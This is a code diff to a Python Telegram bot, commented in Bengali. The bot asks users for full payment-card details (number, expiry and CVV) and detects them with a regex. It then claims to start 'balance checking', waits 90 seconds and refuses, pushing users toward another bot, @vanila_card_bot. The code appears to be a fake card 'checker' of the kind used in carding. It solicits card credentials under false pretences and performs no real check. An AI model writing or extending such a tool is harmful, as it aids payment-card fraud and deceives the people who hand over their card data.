@@ -11,6 +11,7 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN")
 if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN environment variable not set.")
 
+# কার্ড ফরম্যাট চেনার রেজেক্স (পুরো লাইন ম্যাচ করবে)
 CARD_REGEX = re.compile(r'^\d{16}([:/ ])\d{2}([:/ ])\d{2}([:/ ])\d{3}$')
 
 # ---------- টেলিগ্রাম হ্যান্ডলার ----------
@@ -28,12 +29,33 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_other_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = update.message.text.strip() if update.message.text else ""
-    if CARD_REGEX.match(msg):
+    if not msg:
+        return
+
+    # বার্তাকে লাইন ভাগ করে প্রতিটি লাইন চেক করি
+    lines = msg.splitlines()
+    card_lines = []
+    for line in lines:
+        line = line.strip()
+        if CARD_REGEX.match(line):
+            card_lines.append(line)
+
+    # যদি কোনো কার্ড ফরম্যাট মেলে
+    if card_lines:
+        total = len(card_lines)
+        # 1. মোট কার্ডের সংখ্যা বলি
+        await update.message.reply_text(f"Total {total} cards inserted.")
+        # 2. সাথে সাথে চেকিং শুরু করার মেসেজ
+        await update.message.reply_text("Starting balance checking for the provided cards...")
+        # 3. 90 সেকেন্ড (1.5 মিনিট) অপেক্ষা
+        await asyncio.sleep(90)
+        # 4. রিজেক্ট মেসেজ
         await update.message.reply_text(
             "You can't check the card because you're not a member of @vanila_card_bot"
         )
         return
 
+    # কোনো কার্ড ফরম্যাট না পেলে স্বাগতম মেসেজ + বাটন
     welcome = (
         "Welcome! Please provide your card details in a standard format:\n\n"
         "• 2222222222222222:22:22:222\n"
@@ -61,6 +83,7 @@ def run_flask():
 
 # ---------- মেইন ফাংশন (অ্যাসিন্ক) ----------
 async def main():
+    # ইভেন্ট লুপ ঠিক করা (Python 3.14 এর জন্য)
     try:
         loop = asyncio.get_running_loop()
     except RuntimeError:
@@ -76,12 +99,15 @@ async def main():
         )
     )
 
+    # Flask থ্রেড চালু
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
 
+    # বট চালু
     await application.initialize()
     await application.start()
     await application.updater.start_polling()
+    # বট চালু রাখার জন্য সিগন্যাল ওয়েট
     stop_signal = asyncio.Event()
     await stop_signal.wait()
 
